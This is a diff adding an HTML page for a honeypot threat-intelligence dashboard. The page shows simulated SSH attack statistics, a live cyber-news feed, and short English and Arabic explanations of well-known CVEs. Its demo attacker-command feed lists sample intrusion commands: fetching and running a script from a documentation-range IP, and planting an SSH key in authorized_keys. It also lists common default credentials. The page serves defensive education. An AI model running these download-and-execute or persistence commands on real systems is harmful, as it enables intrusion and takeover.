@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>HoneyLens – Honeypot Threat Intelligence</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=IBM+Plex+Sans:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#f3f1ec;--panel:#fff;--ink:#1b1f33;--mute:#6a6f85;--line:#dedbd3;--hot:#e5484d;--cool:#1f8a8a;--amber:#d98a1c;--cell0:#ece9e2;
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#12152a;--panel:#1b1f3a;--ink:#eceaf5;--mute:#9a9fba;--line:#2c3157;--hot:#ff6b6f;--cool:#43c6c0;--amber:#f0a93b;--cell0:#242949}}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.55 "IBM Plex Sans",system-ui,sans-serif}
+h1,h2,h3,.num{font-family:"Space Grotesk",system-ui,sans-serif;margin:0}
+.wrap{max-width:1080px;margin:0 auto;padding:28px 18px 48px}
+header{display:flex;flex-wrap:wrap;justify-content:space-between;gap:12px;align-items:end;margin-bottom:22px}
+h1{font-size:34px;letter-spacing:-.02em}
+header p{margin:4px 0 0;color:var(--mute);max-width:52ch}
+.tag{border:1px solid var(--line);border-radius:99px;padding:4px 12px;font-size:13px;color:var(--mute);background:var(--panel)}
+.grid{display:grid;gap:14px}
+.kpis{grid-template-columns:repeat(auto-fit,minmax(200px,1fr));margin-bottom:14px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px}
+.kpi .num{font-size:30px;font-weight:700}
+.kpi span{color:var(--mute);font-size:13px}
+.hot{color:var(--hot)}.cool{color:var(--cool)}
+.row2{grid-template-columns:1fr;margin-bottom:14px}
+@media(min-width:860px){.row2{grid-template-columns:1.6fr 1fr}}
+h2{font-size:17px;margin-bottom:2px}
+.sub{color:var(--mute);font-size:13px;margin:0 0 12px}
+.scroll{overflow-x:auto}
+#heat{display:grid;grid-template-columns:34px repeat(24,minmax(14px,1fr));gap:3px;min-width:520px}
+#heat i{aspect-ratio:1;border-radius:3px;background:var(--cell0)}
+#heat b{font:500 11px "IBM Plex Sans";color:var(--mute);align-self:center}
+.scale{display:flex;gap:6px;align-items:center;margin-top:10px;font-size:12px;color:var(--mute)}
+.scale i{width:14px;height:14px;border-radius:3px;display:inline-block}
+.bar{display:grid;grid-template-columns:92px 1fr 44px;gap:8px;align-items:center;margin:7px 0;font-size:14px}
+.bar div{height:10px;border-radius:6px;background:var(--cell0)}
+.bar div i{display:block;height:100%;border-radius:6px;background:var(--hot)}
+.bar em{font-style:normal;color:var(--mute);text-align:right}
+table{width:100%;border-collapse:collapse;font-size:14px}
+th{text-align:left;color:var(--mute);font-weight:500;border-bottom:1px solid var(--line);padding:6px 4px}
+td{padding:7px 4px;border-bottom:1px solid var(--line)}
+td:last-child,th:last-child{text-align:right}
+code{font:13px ui-monospace,Menlo,Consolas,monospace}
+.mitre{display:flex;flex-wrap:wrap;gap:8px}
+.mitre span{border:1px solid var(--line);border-left:4px solid var(--amber);border-radius:8px;padding:6px 10px;font-size:13px}
+.mitre small{color:var(--mute);display:block}
+.flow{display:flex;flex-wrap:wrap;gap:8px;align-items:stretch}
+.flow div{flex:1 1 140px;border:1px solid var(--line);border-radius:10px;padding:10px 12px;font-size:13px;position:relative}
+.flow b{display:block;font-family:"Space Grotesk",sans-serif;font-size:14px;margin-bottom:2px}
+.flow div:not(:last-child)::after{content:"›";position:absolute;right:-9px;top:50%;transform:translateY(-50%);color:var(--mute);font-size:18px;background:var(--bg);width:10px;text-align:center}
+.feed{max-height:230px;overflow:auto;font-size:13px}
+.feed div{padding:6px 0;border-bottom:1px solid var(--line);display:flex;gap:10px}
+.feed time{color:var(--mute);min-width:56px}
+.chips{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px}
+.chips button{font:inherit;font-size:13px;border:1px solid var(--line);background:var(--panel);color:var(--ink);border-radius:99px;padding:5px 14px;cursor:pointer}
+.chips button[aria-pressed="true"]{background:var(--ink);color:var(--bg);border-color:var(--ink)}
+.chips button:focus-visible{outline:2px solid var(--cool);outline-offset:2px}
+.news a{display:block;padding:10px 0;border-bottom:1px solid var(--line);color:inherit;text-decoration:none}
+.news a:hover b{text-decoration:underline}
+.news small{color:var(--mute);display:flex;gap:10px;flex-wrap:wrap}
+.pill{border-radius:99px;padding:0 8px;font-size:12px;border:1px solid var(--line)}
+.vgrid{grid-template-columns:repeat(auto-fit,minmax(300px,1fr))}
+.vuln h3{font-size:17px}
+.cve{color:var(--hot);font:500 13px ui-monospace,Menlo,Consolas,monospace}
+.sev{float:right;font-size:12px;border-radius:6px;padding:1px 8px;background:var(--hot);color:#fff}
+.vuln p{margin:8px 0}
+.ar{direction:rtl;text-align:right;border-top:1px dashed var(--line);padding-top:8px}
+.hide{display:none!important}
+.src{color:var(--mute);font-size:13px;margin:10px 0 0}
+.demo,.live{display:inline-block;vertical-align:middle;margin-left:8px;font:500 11px "IBM Plex Sans",sans-serif;border-radius:99px;padding:1px 9px;border:1px solid var(--amber);color:var(--amber)}
+.live{border-color:var(--cool);color:var(--cool)}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+  <div>
+    <h1>HoneyLens</h1>
+    <p>Real attacks on an SSH honeypot, collected, enriched and explained in one dashboard.</p>
+  </div>
+  <span class="tag">Attack stats: sample until Cowrie is connected · News: live</span>
+</header>
+
+<p class="sub"><span class="demo" style="margin:0 8px 0 0">Demo data</span>The attack numbers and charts below are simulated for the demo. The news and vulnerability sections are real.</p>
+<section class="grid kpis">
+  <div class="card kpi"><span>Attack attempts (7 days)</span><div class="num hot" id="k1"></div></div>
+  <div class="card kpi"><span>Unique attacker IPs</span><div class="num" id="k2"></div></div>
+  <div class="card kpi"><span>Successful logins on honeypot</span><div class="num" id="k3"></div></div>
+  <div class="card kpi"><span>IPs auto-blocked</span><div class="num cool" id="k4"></div></div>
+</section>
+
+<section class="grid row2">
+  <div class="card">
+    <h2>When attackers show up<span class="demo">Demo data</span></h2>
+    <p class="sub">Attempts per hour (UTC), last 7 days. Darker means more.</p>
+    <div class="scroll"><div id="heat"></div></div>
+    <div class="scale">Fewer <i style="background:var(--cell0)"></i><i style="background:#f3b9a0"></i><i style="background:#ee8a6c"></i><i style="background:var(--hot)"></i> More</div>
+  </div>
+  <div class="card">
+    <h2>Top source countries<span class="demo">Demo data</span></h2>
+    <p class="sub">Share of all attempts</p>
+    <div id="countries"></div>
+  </div>
+</section>
+
+<section class="grid row2">
+  <div class="card">
+    <h2>Most tried credentials<span class="demo">Demo data</span></h2>
+    <p class="sub">What bots guess first</p>
+    <table><thead><tr><th>Username</th><th>Password</th><th>Tries</th></tr></thead><tbody id="creds"></tbody></table>
+  </div>
+  <div class="card">
+    <h2>Live attacker commands<span class="demo">Demo data</span></h2>
+    <p class="sub">Typed inside the honeypot shell</p>
+    <div class="feed" id="feed"></div>
+  </div>
+</section>
+
+<section class="card" style="margin-bottom:14px">
+  <h2>Mapped to MITRE ATT&amp;CK<span class="demo">Demo data</span></h2>
+  <p class="sub">Every captured command is tagged with the technique it belongs to</p>
+  <div class="mitre">
+    <span>Brute Force<small>T1110 · 18,420 events</small></span>
+    <span>Remote Services: SSH<small>T1021.004 · 3,112 events</small></span>
+    <span>Ingress Tool Transfer<small>T1105 · 640 events</small></span>
+    <span>System Information Discovery<small>T1082 · 1,905 events</small></span>
+    <span>Resource Hijacking<small>T1496 · 212 events</small></span>
+  </div>
+</section>
+
+<section class="card news" style="margin-bottom:14px">
+  <h2>Cyber news, one place<span class="live">Live</span></h2>
+  <p class="sub" id="newsSub"></p>
+  <div class="chips" id="newsChips">
+    <button aria-pressed="true" data-t="all">All</button><button aria-pressed="false" data-t="Ransomware">Ransomware</button><button aria-pressed="false" data-t="Vulnerability">Vulnerability</button><button aria-pressed="false" data-t="Data breach">Data breach</button><button aria-pressed="false" data-t="Malware">Malware</button><button aria-pressed="false" data-t="General">General</button>
+  </div>
+  <div id="newsList"></div>
+  <p class="src">Sources: The Hacker News, BleepingComputer, Krebs on Security.</p>
+</section>
+
+<section style="margin-bottom:14px">
+  <div style="display:flex;flex-wrap:wrap;justify-content:space-between;gap:10px;align-items:end;margin-bottom:10px">
+    <div><h2>Famous vulnerabilities</h2><p class="sub" style="margin:0">Explained in English and Arabic</p></div>
+    <div class="chips" id="langChips" style="margin:0">
+      <button aria-pressed="true" data-l="both">EN + عربي</button><button aria-pressed="false" data-l="en">English</button><button aria-pressed="false" data-l="ar">عربي</button>
+    </div>
+  </div>
+  <div class="grid vgrid" id="vulns"></div>
+</section>
+
+<section class="card">
+  <h2>How it works</h2>
+  <p class="sub">The pipeline you will build</p>
+  <div class="flow">
+    <div><b>Cowrie honeypot</b>SSH/Telnet on a small VPS</div>
+    <div><b>Python parser</b>JSON logs to SQL tables</div>
+    <div><b>Enrichment</b>GeoIP, AbuseIPDB, VirusTotal hashes</div>
+    <div><b>Detection</b>Rules plus ATT&amp;CK tagging</div>
+    <div><b>Dashboard</b>Streamlit or Power BI</div>
+  </div>
+</section>
+</div>
+
+<script>
+(function(){
+  var s=7;function r(){s=(s*9301+49297)%233280;return s/233280}
+  function fmt(n){return n.toLocaleString("en-US")}
+  var el=function(id){return document.getElementById(id)};
+  el("k1").textContent=fmt(24318);el("k2").textContent=fmt(1472);el("k3").textContent=fmt(386);el("k4").textContent=fmt(913);
+
+  var days=["Mon","Tue","Wed","Thu","Fri","Sat","Sun"],h=document.getElementById("heat"),out='<b></b>';
+  for(var x=0;x<24;x++)out+='<b>'+(x%6==0?x:'')+'</b>';
+  var shades=["var(--cell0)","#f3b9a0","#ee8a6c","var(--hot)"];
+  for(var d=0;d<7;d++){out+='<b>'+days[d]+'</b>';
+    for(var x=0;x<24;x++){var v=r()+(x>=1&&x<=5?.35:0)+(d==5?.15:0);var l=v<.35?0:v<.7?1:v<1?2:3;
+      out+='<i style="background:'+shades[l]+'" title="'+days[d]+' '+x+':00"></i>'}}
+  h.innerHTML=out;
+
+  var c=[["China",27],["United States",19],["Russia",14],["Brazil",9],["India",8],["Vietnam",6],["Germany",5]];
+  el("countries").innerHTML=c.map(function(a){return '<div class="bar"><span>'+a[0]+'</span><div><i style="width:'+(a[1]*3.4)+'%"></i></div><em>'+a[1]+'%</em></div>'}).join("");
+
+  var cr=[["root","123456",2841],["root","admin",1920],["admin","admin",1577],["ubuntu","ubuntu",1204],["pi","raspberry",988],["test","test",760]];
+  el("creds").innerHTML=cr.map(function(a){return '<tr><td><code>'+a[0]+'</code></td><td><code>'+a[1]+'</code></td><td>'+fmt(a[2])+'</td></tr>'}).join("");
+
+  var f=[["02:14","uname -a"],["02:14","cat /proc/cpuinfo"],["02:15","wget http://203.0.113.9/x.sh"],["02:15","chmod +x x.sh; ./x.sh"],["02:31","crontab -l"],["03:02","echo \"ssh-rsa AAAA…\" >> ~/.ssh/authorized_keys"]];
+  el("feed").innerHTML=f.map(function(a){return '<div><time>'+a[0]+'</time><code>'+a[1].replace(/</g,"&lt;")+'</code></div>'}).join("");
+  var NEWS=/*NEWS_JSON*/{"updated":"","items":[]};
+  function esc(x){return String(x).replace(/[&<>"']/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]})}
+  function ago(iso){var d=new Date(iso);if(isNaN(d))return "";var n=Math.floor((Date.now()-d)/864e5);return n<=0?"Today":n==1?"Yesterday":n+" days ago"}
+  function drawNews(t){
+    var list=NEWS.items.filter(function(n){return t=="all"||n.tag==t}).slice(0,30);
+    el("newsList").innerHTML=list.map(function(n){
+      var u=/^https?:\/\//.test(n.link)?n.link:"#";
+      return '<a href="'+esc(u)+'" target="_blank" rel="noopener noreferrer"><b>'+esc(n.title)+'</b><small><span class="pill">'+esc(n.tag)+'</span><span>'+esc(n.source)+'</span><span>'+ago(n.published)+'</span></small></a>'
+    }).join("")||'<p class="sub">No stories with this tag yet.</p>';
+  }
+  el("newsSub").textContent="Collected daily from security RSS feeds. "+(NEWS.updated?"Last updated (UTC): "+NEWS.updated.replace("T"," ").replace("+00:00",""):"No data yet: run news_collector.py.");
+  drawNews("all");
+  function pick(box,attr,cb){el(box).addEventListener("click",function(e){var b=e.target.closest("button");if(!b)return;[].forEach.call(el(box).children,function(x){x.setAttribute("aria-pressed",x===b)});cb(b.getAttribute(attr))})}
+  pick("newsChips","data-t",drawNews);
+
+  var v=[
+   ["Log4Shell","CVE-2021-44228","Critical 10.0","A flaw in the Log4j logging library lets an attacker make the server fetch and run code just by getting a crafted string written to a log, such as a User-Agent header.","Fix: upgrade Log4j to 2.17.1 or later.","ثغرة في مكتبة Log4j لتسجيل الأحداث. المهاجم يبعت نص خاص (زي في الـ User-Agent) والسيرفر يسجّله فيتنفّذ كود من بعيد.","الحل: تحديث Log4j لإصدار 2.17.1 أو أحدث."],
+   ["EternalBlue","CVE-2017-0144","Critical 8.1","A bug in Microsoft SMBv1 allows remote code execution without logging in. It powered the WannaCry and NotPetya outbreaks.","Fix: apply MS17-010 and disable SMBv1.","ثغرة في بروتوكول SMBv1 من مايكروسوفت بتسمح بتنفيذ كود عن بُعد من غير تسجيل دخول. اتستخدمت في هجمات WannaCry وNotPetya.","الحل: تثبيت تحديث MS17-010 وتعطيل SMBv1."],
+   ["Heartbleed","CVE-2014-0160","High 7.5","A missing bounds check in OpenSSL's heartbeat feature lets attackers read chunks of server memory, which can include private keys and passwords.","Fix: upgrade OpenSSL and rotate keys and certificates.","نقص في فحص الحدود داخل خاصية heartbeat في OpenSSL بيخلّي المهاجم يقرا أجزاء من ذاكرة السيرفر، ممكن تحتوي على مفاتيح خاصة وباسوردات.","الحل: تحديث OpenSSL وتغيير المفاتيح والشهادات."],
+   ["Shellshock","CVE-2014-6271","Critical 9.8","Bash executes commands hidden after a function definition in an environment variable. Web servers running CGI scripts passed attacker input straight into it.","Fix: update Bash and retire old CGI scripts.","الـ Bash بينفّذ أوامر مخفية بعد تعريف دالة جوه متغير بيئة. سيرفرات الويب اللي بتشغّل CGI كانت بتمرّر مدخلات المهاجم له مباشرة.","الحل: تحديث Bash والتخلص من سكربتات CGI القديمة."],
+   ["regreSSHion","CVE-2024-6387","High 8.1","A race condition in OpenSSH's signal handler can give unauthenticated remote code execution as root on glibc-based Linux. Directly relevant to an SSH honeypot.","Fix: upgrade OpenSSH to 9.8 or later.","ثغرة race condition في معالج الإشارات داخل OpenSSH ممكن تدّي المهاجم تنفيذ كود عن بُعد بصلاحية root من غير مصادقة. مهمة جدًا لمشروع SSH honeypot.","الحل: تحديث OpenSSH لإصدار 9.8 أو أحدث."]
+  ];
+  el("vulns").innerHTML=v.map(function(a){return '<article class="card vuln"><span class="sev">'+a[2]+'</span><h3>'+a[0]+'</h3><div class="cve">'+a[1]+'</div><div class="en"><p>'+a[3]+'</p><p><b>'+a[4]+'</b></p></div><div class="ar" lang="ar"><p>'+a[5]+'</p><p><b>'+a[6]+'</b></p></div></article>'}).join("");
+  pick("langChips","data-l",function(l){[].forEach.call(document.querySelectorAll(".vuln .en"),function(x){x.classList.toggle("hide",l=="ar")});[].forEach.call(document.querySelectorAll(".vuln .ar"),function(x){x.classList.toggle("hide",l=="en")})});
+})();
+</script>
+</body>
+</html>
